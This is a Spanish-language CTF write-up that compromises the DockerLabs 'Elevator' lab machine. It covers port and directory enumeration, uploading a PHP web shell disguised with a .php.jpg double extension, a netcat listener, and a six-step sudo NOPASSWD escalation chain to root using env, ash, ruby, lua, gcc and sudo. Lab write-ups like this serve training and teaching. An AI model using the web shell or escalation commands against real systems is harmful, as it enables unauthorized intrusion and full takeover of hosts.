# 🛡️ Informe de Pentesting – Máquina *Elevator*

## 🧠 Descripción

La máquina vulnerable *Elevator* fue descargada desde la página oficial de [DockerLabs](https://www.dockerlabs.com), diseñada con múltiples niveles de escalada de privilegios. El objetivo es comprometer la máquina inicial con permisos restringidos y, mediante una cadena de escaladas, llegar a ser *root*.

---

## 🎯 Objetivos

* Obtener acceso inicial a la máquina mediante una vulnerabilidad web.
* Escalar privilegios sucesivamente entre usuarios hasta obtener acceso como *root*.

---

## ⚙️ Fase de Preparación

1. **Despliegue de la máquina:**

   ```bash
   unzip elevator.zip
   sudo bash auto_deploy.sh elevator.tar
   ```

2. **Verificación de conectividad:**

   ```bash
   ping -c4 172.17.0.2
   ```

   ![/Elevator/Imagenes/Ping.jpeg](Elevator/Imagenes/Ping.jpeg)

---

## 🔍 Fase de Reconocimiento

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

> Resultado: Sólo el puerto **80/tcp** (HTTP) está abierto.
> ![/Elevator/Imagenes/Puertos.jpeg](Elevator/Imagenes/Puertos.jpeg)

### Extracción de puertos relevantes

```bash
extractPorts allPorts.txt
```

![/Elevator/Imagenes/Servicios.jpeg](Elevator/Imagenes/Servicios.jpeg)

---

## 🌐 Fase de Enumeración Web

### Acceso al sitio principal

Se accede a la IP desde el navegador:

> [http://172.17.0.2](http://172.17.0.2)
> ![/Elevator/Imagenes/Pagina.jpeg](Elevator/Imagenes/Pagina.jpeg)
> No se observa contenido útil directamente.

### Fuzzing de directorios con Gobuster

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x php,html,txt
```

Se descubre el directorio `/themes/` y otros.
![/Elevator/Imagenes/Fuzzing.jpeg](Elevator/Imagenes/Fuzzing.jpeg)

### Fuzzing en subdirectorios descubiertos

```bash
gobuster dir -u http://172.17.0.2/themes/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x php,html,txt
```

---

## 🐚 Acceso Inicial: Web Shell

Se descubre un formulario de carga de imágenes en:

> [http://172.17.0.2/themes/archivo.html](http://172.17.0.2/themes/archivo.html)
> ![/Elevator/Imagenes/Subir.jpeg](Elevator/Imagenes/Subir.jpeg)

Y un directorio donde se almacenan los archivos subidos:

> [http://172.17.0.2/themes/uploads](http://172.17.0.2/themes/uploads)
> ![/Elevator/Imagenes/Directorio.jpeg](Elevator/Imagenes/Directorio.jpeg)

### Bypass de restricción de extensión

Se utiliza una *reverse shell* en PHP renombrada con doble extensión (`.php.jpg`) para evadir el filtro de archivos.

```php
<?php system($_GET['cmd']); ?>
```

Comando de subida: *(ejemplo usando navegador o interceptando con Burp Suite)*
![/Elevator/Imagenes/Gitrevershell.jpeg](Elevator/Imagenes/Gitrevershell.jpeg)
![/Elevator/Imagenes/tricks.jpeg](Elevator/Imagenes/tricks.jpeg)

Se verifica que el archivo se subió correctamente y se puede ejecutar:
![/Elevator/Imagenes/Subida.jpeg](Elevator/Imagenes/Subida.jpeg)
![/Elevator/Imagenes/Archivo.jpeg](Elevator/Imagenes/Archivo.jpeg)

---

## 📡 Establecer Reverse Shell

Desde el atacante, se escucha con Netcat:

```bash
sudo nc -lvnp 443
```

![/Elevator/Imagenes/Escucha.jpeg](Elevator/Imagenes/Escucha.jpeg)

Se accede al archivo malicioso para obtener la terminal:

> [http://172.17.0.2/themes/uploads/php\_revell\_shell.php.jpg](http://172.17.0.2/themes/uploads/php_revell_shell.php.jpg)

Se obtiene acceso como el usuario restringido `www-data`.

---

## 🔼 Escalada de Privilegios

Se ejecuta `sudo -l` para ver comandos permitidos por `sudo`:

### Ruta de escalada:

1. `www-data` → `daphne` vía `sudo -u daphne /usr/bin/env /bin/bash`
2. `daphne` → `vilma` vía `sudo -u vilma /usr/bin/ash`
3. `vilma` → `shaggy` vía `sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'`
4. `shaggy` → `fred` vía `sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'`
5. `fred` → `scooby` vía `sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .`
6. `scooby` → `root` vía `sudo -u root /usr/bin/sudo su`

Cada salto se realiza sin necesidad de contraseñas debido a configuraciones de `NOPASSWD`.
![/Elevator/Imagenes/Intrusion.jpeg](Elevator/Imagenes/Intrusion.jpeg)
![/Elevator/Imagenes/Escalada.jpeg](Elevator/Imagenes/Escalada.jpeg)

---

## ✅ Resultado Final

Se logra acceso completo como **root**, cumpliendo todos los objetivos de la máquina.

---

## 🧾 Conclusiones

* La máquina simula una escalada de privilegios en cadena, útil para entender la importancia de permisos restrictivos con `sudo`.
* La validación de archivos por extensión puede ser fácilmente evadida si no se implementa correctamente.
* Enumerar servicios y directorios ocultos es esencial para detectar vectores de ataque.
